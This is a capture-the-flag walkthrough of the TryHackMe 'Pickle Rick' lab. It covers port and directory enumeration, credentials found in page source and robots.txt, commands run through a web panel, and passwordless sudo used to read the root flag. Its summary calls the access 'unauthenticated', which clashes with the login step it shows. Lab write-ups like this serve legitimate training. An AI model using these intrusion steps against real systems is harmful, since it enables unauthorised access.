---
title: "TryHackMe: Pickle Rick Walkthrough"
slug: "tryhackme-pickle-rick"
date: "2026-08-05"
platform: "TryHackMe"
difficulty: "Easy"
category: "Web Exploitation"
tags:
  - web
  - command-injection
  - privilege-escalation
summary: "A Rick and Morty themed CTF challenge requiring web enumeration, unauthenticated command injection, and sudo privilege escalation."
readingTime: "8 min read"
featuredImage: "/writeups/tryhackme/pickle_rick/banner.png"
featured: true
objectives:
  - Perform web service enumeration with Nmap and GoBuster.
  - Exploit command injection vulnerability in the portal interface.
  - Escalate privileges to root using passwordless sudo.
tools:
  - Nmap
  - GoBuster
  - Burp Suite
  - Netcat
---

### 1. Initial Reconnaissance & Scanning

We start by running an Nmap scan against the target IP address to discover open ports and running services:

```bash
nmap -sC -sV -oN nmap/initial.nmap $TARGET_IP
```

#### Discovered Services:
- **Port 22 (SSH)**: Open (OpenSSH 7.2p2)
- **Port 80 (HTTP)**: Open (Apache httpd 2.4.18)

Viewing the page source reveals a hidden username comment:

```html
<!-- Note to self: Username is R1ckRul3s -->
```

---

### 2. Directory Fuzzing & Ingredient #1

Using **GoBuster** to enumerate directories and files:

```bash
gobuster dir -u http://$TARGET_IP/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

#### Key Findings:
- `/robots.txt` -> Contains string: `Wubbalubbadubdub`
- `/login.php` -> Login portal interface

Using username `R1ckRul3s` and password `Wubbalubbadubdub`, we gain access to the Command Panel.

![Command Panel](/writeups/tryhackme/pickle_rick/panel.png)

Executing commands in the panel reveals **Ingredient 1**:

```bash
cat "Sup3r_S3cur3_fl4g.txt"
```

---

### 3. Privilege Escalation

Checking `sudo -l` permissions:

```bash
sudo -l
```

Output shows user `www-data` can run **all commands as root without a password**:

```bash
(ALL : ALL) NOPASSWD: ALL
```

Read the root flag directly:

```bash
sudo cat /root/3rd.txt
```
